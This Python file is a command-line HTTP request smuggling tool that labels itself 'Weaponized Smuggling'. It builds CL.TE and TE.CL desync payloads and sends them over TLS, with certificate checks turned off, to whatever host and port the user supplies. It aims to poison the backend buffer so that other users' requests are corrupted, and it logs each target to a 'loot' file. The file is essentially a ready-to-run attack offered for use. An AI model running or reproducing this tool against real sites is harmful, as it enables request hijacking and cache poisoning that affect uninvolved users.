import socket
import ssl
import sys
import os

def smuggle_desync(host, port, technique="CL.TE"):
    """
    Weaponized Smuggling: Injects malformed chunked requests to 
    desynchronize the proxy-to-backend socket stream.
    """
    print(f"[*] Initiating {technique} Smuggling attack on {host}:{port}")
    
    # Payload Primitives
    # G = Smuggled Prefix to poison the next request
    if technique == "CL.TE":
        # Proxy uses CL (4), Backend uses TE (chunked)
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G" 
        ).encode()
    elif technique == "TE.CL":
        # Proxy uses TE, Backend uses CL
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "X"
        ).encode()
    else:
        print("[-] Unsupported technique. Use CL.TE or TE.CL")
        return

    try:
        context = ssl.create_default_context()
        # Bypass cert verification for research targets
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with socket.create_connection((host, int(port))) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                print(f"[*] Sending desync sequence ({len(payload)} bytes)...")
                ssock.sendall(payload)
                
                # We don't necessarily wait for a response here; 
                # the goal is to leave the 'G' or 'X' in the backend buffer.
                print("[!] PAYLOAD DISPATCHED. Backend socket buffer poisoned.")
                
                # Log the attempt
                with open("../loot/smuggle_history.log", "a") as f:
                    f.write(f"Target: {host} | Tech: {technique} | Bytes: {len(payload)}\n")
                    
    except Exception as e:
        print(f"[-] Protocol Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 134_smuggler <host> <port> [technique: CL.TE|TE.CL]")
        sys.exit(1)
    
    tech = sys.argv[3].upper() if len(sys.argv) > 3 else "CL.TE"
    smuggle_desync(sys.argv[1], sys.argv[2], tech)
